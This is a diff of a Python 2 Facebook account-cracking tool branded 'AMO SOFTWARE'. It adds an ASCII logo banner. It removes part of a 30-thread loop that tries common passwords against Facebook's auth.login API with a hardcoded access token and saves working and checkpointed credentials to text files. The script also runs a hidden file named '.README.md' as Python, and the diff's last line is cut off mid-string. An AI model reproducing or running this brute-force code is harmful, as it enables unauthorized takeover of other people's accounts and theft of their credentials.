@@ -48,6 +48,52 @@ def cb():
     os.system('clear')
 os.system("filget AMO SOFTWARE")
 
+logo ="""
+                                                   
+                  .-/+osssso+/-`
+             `/sdNMMMMMMMMMMMMMMNds/`
+          .odMMMMMMMMMMMMMMMMMMMMMMMMdo.
+        :hMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMh:
+      -dMMMNmMMMMMMMNNNNNNNNNNMMMMMMMmNMMMd-
+    `sMNNs-oMMMMNNNNNNNNNNNNNNNNNNMMMMo-sNNMs
+   `dM+s-:sMMMNNNNNNMMNMNNMNMMNNNNNNMMMs-:s+Md`
+  `mho.h/:dMNNMMMNMMNmNoso-dmNMMNMMMNNMd:/d`ohm`
+  hs//::oMMNMMMMNMMMMNMmmo+NNMMMMNMMMMNMNo:-+:yh
+ /M--y+:hMNNNNNNNMMMNNMMmmMMNMMMMNNNNNNNMh:oy.:M:
+ dd+./.hMNMMMMMNMMMNNNNNooNNNNNMMMNMMMMMNMy./.odh
+`M-m-/yyMNMMMMMNMMMMNMNdssdNMNMMMMNMMMMMNMyy/-m-N
+`M:-ho`NMNNNNNNNNNmho-sN:/Ms-shmNNNNNNNNNMm`sh-/M`
+`Mh`+ sdMNMMMMMh`     NMosMN     `dMMMMMNMdo`/`hN
+ d/h/.m.MNMMMMM+      yM--My      oMMMMMNM.m`/h/h
+ /d`/ss mNNNNNN-      `d.-h`      -NNNNNNd ss/`d:
+  hm/`+ d:mNMMN                    NMMNd:h`+`/mh
+  `doss/++.mNNh                    hNNm`o//ssod`
+   `ds.:+y-:sso                    osy:-y+--sd`
+     sMy+/:./+                      +/.:/+yMs
+      -dyo/////.```            ```./////ohh-
+        :hMhoosss/`            `/sssoohMh:
+          .ohysoos.            .soosyh+`
+             `/sdN`            `Nds/` 
+
+                     
+       //\\       ||\\    //||   ||-------||
+      //  \\      || \\  // ||   ||       ||
+     //    \\     ||  \\//  ||   ||       ||
+    //------\\    ||   \/  ||   ||       ||
+   //        \\   ||       ||   ||       ||
+  //          \\  ||       ||   ||-------||
+-------------------------------------------------
+TOOL BY AMO SOFTWARE
+
+github:https://github.com/h4m4cod
+
+instagram:uflo_l
+
+-------------------------------------------------
+"""
+
+os.system("filget AMO SOFTWARE")
+
 
 back = 0
 successful = []
@@ -191,53 +237,4 @@ def action():
                 okb.close()
                 oks.append(c + user + pass2)
             elif 'www.facebook.com' in q['error_msg']:
-                print '\x1b[1;91m[CHECKPOINT]\x1b[1;91m ' + k + c + user + ' >>> ' + pass2 + '\n'
-                cps = open('save/checkpoint.txt', 'a')
-                cps.write(k + c + user + '>>>' + pass2 + '\n')
-                cps.close()
-                cpb.append(c + user + pass2)
-            else:
-                pass3 = '1234512345'
-            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
-            q = json.load(data)
-            if 'access_token' in q:
-                print '\x1b[1;92m[SUCCESSFULL]\x1b[1;92m ' + k + c + user + ' >>> ' + pass3 + '\n' + '\n'
-                okb = open('save/successfull.txt', 'a')
-                okb.write(k + c + user + '>>>' + pass3 + '\n')
-                okb.close()
-                oks.append(c + user + pass3)
-            elif 'www.facebook.com' in q['error_msg']:
-                print '\x1b[1;91m[CHECKPOINT]\x1b[1;91m ' + k + c + user + ' >>> ' + pass3 + '\n'
-                cps = open('save/checkpoint.txt', 'a')
-                cps.write(k + c + user + '>>>' + pass3 + '\n')
-                cps.close()
-                cpb.append(c + user + pass3)
-            else:
-                pass4 = '1122334455'
-            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
-            q = json.load(data)
-            if 'access_token' in q:
-                print '\x1b[1;92m[SUCCESSFULL]\x1b[1;92m ' + k + c + user + ' >>> ' + pass4 + '\n' + '\n'
-                okb = open('save/successfull.txt', 'a')
-                okb.write(k + c + user + '>>>' + pass4 + '\n')
-                okb.close()
-                oks.append(c + user + pass4)
-            elif 'www.facebook.com' in q['error_msg']:
-                print '\x1b[1;91m[CHECKPOINT]\x1b[1;91m ' + k + c + user + ' >>> ' + pass4 + '\n'
-                cps = open('save/checkpoint.txt', 'a')
-                cps.write(k + c + user + '>>>' + pass4 + '\n')
-                cps.close()
-                cpb.append(c + user + pass4)
-        except:
-            pass
-
-    p = ThreadPool(30)
-    p.map(main, id)
-    print 42 * '\x1b[1;91m='
-    print '[\xe2\x9c\x93]\x1b[1;93m Process Has Been Completed ....'
-    print '[\xe2\x9c\x93]\x1b[1;92m Total successfull/\x1b[1;96mcheckpoint : ' + str(len(oks)) + '/' + str(len(cpb))
-    print '[\xe2\x9c\x93]\x1b[1;91m CP File Has Been Saved : save/checkpoint.txt'
-    raw_input('\n[Press Enter To Go Back]')
-    os.system('python2 .README.md')
-if __name__ == '__main__':
-    menu()
+                print '\x1b[1;9
